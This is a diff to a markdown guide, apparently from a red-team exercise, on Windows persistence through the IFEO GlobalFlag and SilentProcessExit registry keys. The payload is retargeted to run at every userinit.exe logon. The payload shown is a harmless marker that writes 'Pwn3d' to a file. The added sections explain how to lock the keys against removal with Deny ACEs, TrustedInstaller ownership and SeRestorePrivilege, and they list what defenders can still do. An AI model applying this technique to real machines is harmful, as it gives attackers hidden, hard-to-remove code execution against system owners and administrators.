@@ -70,53 +70,45 @@ winlogon.exe
 LogonUI / userinit.exe  ← login happens here
 ```
 
-**wininit.exe**
-- Starts very early (before login)
-- Completes its job (initialises Session 0, starts `services.exe`, `lsass.exe`, `winlogon.exe`)
-- Then exits
-
-This makes it a classic SilentProcessExit target in red team literature.
+**userinit.exe**
+- Runs at every login
+- Initialises the user shell (starts `explorer.exe`), processes Group Policy scripts
+- Then exits — making it a reliable SilentProcessExit trigger on every user logon
 
 ## How it works
 
 ### The two keys
 
-**Step 1 — under IFEO (already familiar):**
+**Step 1 — under IFEO:**
 ```
-HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\userinit.exe
     GlobalFlag = 0x200  (REG_DWORD)
 ```
 The `GlobalFlag` value `0x200` means: "Monitor this process for its exit." It is what activates the mechanism in the first place.
 
 **Step 2 — in a new location:**
 ```
-HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\wininit.exe
-    MonitorProcess = "C:\path\to\your\script.exe"
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\userinit.exe
+    MonitorProcess = "C:\Windows\System32\cmd.exe /c echo Pwn3d > C:\Users\Public\Documents\pwned.txt"
     ReportingMode  = 0x1  (REG_DWORD)
 ```
-`MonitorProcess` is your payload. `ReportingMode = 1` tells Windows: "Launch this process instead of just writing a dump."
+`MonitorProcess` is the payload. `ReportingMode = 1` tells Windows: "Launch this process instead of just writing a dump."
 
 ### How they interact
 ```
-wininit.exe exits
+userinit.exe exits (every user logon)
       ↓
 Windows Kernel checks: GlobalFlag 0x200 set?
       ↓ yes
-Windows reads SilentProcessExit\wininit.exe
+Windows reads SilentProcessExit\userinit.exe
       ↓
 Launches MonitorProcess
 ```
 
-### Calling the script
-`MonitorProcess` expects an executable, so the script must be called in a way that looks like one:
-```
-MonitorProcess = "powershell.exe -ExecutionPolicy Bypass -File C:\path\script.ps1"
-```
-No external tools — only built-in Windows components.
-
 ### Script contents
-```powershell
-Set-Content -Path "C:\Users\Public\Documents\pwned.txt" -Value "Pwn3d" -Encoding UTF8
+The payload runs inline — no dropped file required:
+```
+cmd.exe /c echo Pwn3d > C:\Users\Public\Documents\pwned.txt
 ```
 
 ### Hiding the payload
@@ -154,7 +146,7 @@ PowerShell ignores the extension and executes the contents.
 
 **Option B: Inline command in the registry value**
 ```
-MonitorProcess = "powershell.exe -ExecutionPolicy Bypass -Command \"Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Encoding UTF8\""
+MonitorProcess = "cmd.exe /c echo Pwn3d > C:\Users\Public\Documents\pwned.txt"
 ```
 
 ### Protection against deletion
@@ -169,38 +161,53 @@ Access denied
 ```
 If the defender cannot delete your registry key, it does not matter whether it finds it.
 
-#### How it works in practice
-With PowerShell you can set the ACL of a registry key so that only SYSTEM is allowed to write:
-```powershell
-$path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\wininit.exe"
-$acl = Get-Acl $path
+#### Layer 1: Deny ACE for Everyone
 
-# Remove all existing rules
-$acl.SetAccessRuleProtection($true, $false)
+Both keys (`IFEO\userinit.exe` and `SilentProcessExit\userinit.exe`) get a Deny ACE for `Everyone` covering:
 
-# Only SYSTEM gets full control
-$rule = New-Object System.Security.AccessControl.RegistryAccessRule(
-    "SYSTEM",
-    "FullControl",
-    "Allow"
-)
-$acl.AddAccessRule($rule)
-Set-Acl -Path $path -AclObject $acl
+| Right | Blocks |
+|---|---|
+| `Delete` | Deleting the key itself |
+| `SetValue` | Removing or modifying values within the key |
+| `ChangePermissions` | Modifying the DACL to remove the Deny rules |
+| `TakeOwnership` | Taking ownership via the DACL path |
+
+Denying `ChangePermissions` is the critical addition. Without it, a defender that opens the key with `ChangePermissions` access can simply strip the Deny rules before proceeding — which is exactly what advanced defender scripts do.
+
+#### Layer 2: TrustedInstaller as owner
+
+After setting the Deny ACE, ownership of both keys is transferred to `NT SERVICE\TrustedInstaller`.
+
+Why this matters: in Windows, the owner of an object always retains `WRITE_DAC` (the right to modify the DACL), regardless of what the DACL says. If Administrators owned the key, any elevated process could use that implicit `WRITE_DAC` to rewrite the ACL. With TrustedInstaller as owner, that path is closed.
+
+#### Why this requires SeRestorePrivilege
+
+Setting the owner to an account you are not a member of requires `SeRestorePrivilege` to be explicitly enabled in the process token. This privilege is present but disabled by default in elevated admin tokens — it must be activated via `AdjustTokenPrivileges` before calling `SetAccessControl`. The script does this via a small P/Invoke helper.
+
+The order is:
 ```
-The defender process — even running as Administrator — can now no longer delete the key.
-
-**Note:**
+1. Create keys + set values
+2. Enable SeRestorePrivilege + SeTakeOwnershipPrivilege (P/Invoke)
+3. Set owner → TrustedInstaller        ← must happen before the Deny
+4. Set Deny ACE (Delete|SetValue|ChangePermissions|TakeOwnership)
 ```
-SYSTEM  → can override ACLs (SeDebugPrivilege, SeTakeOwnershipPrivilege)
-Admin   → can take ownership → then modify the ACL → then delete
-```
-ACLs are therefore not absolute protection, only an obstacle.
+Step 3 must come before step 4: once `TakeOwnership` is denied, opening the key with that access right fails.
 
-Even in the worst case — the defender finds everything — the ACL protects the entry as long as the defender does not explicitly take ownership:
+#### Remaining attack surface for the defender
+
+The only reliable bypass at this point is:
+1. Enable `SeTakeOwnershipPrivilege` explicitly in the token
+2. Take ownership back (e.g. to Administrators)
+3. Rewrite the DACL
+4. Delete the key
+
+A standard defender script that only calls `Remove-Item -Force` or tries `OpenSubKey` with `ChangePermissions` will fail at every step.
+
+Even if the defender finds everything, the ACL buys the decisive moment:
 ```
 Defender finds entry + cannot delete it (ACL)
     ↓
-Reboot
+Reboot / next logon
     ↓
 SilentProcessExit triggers anyway
     ↓
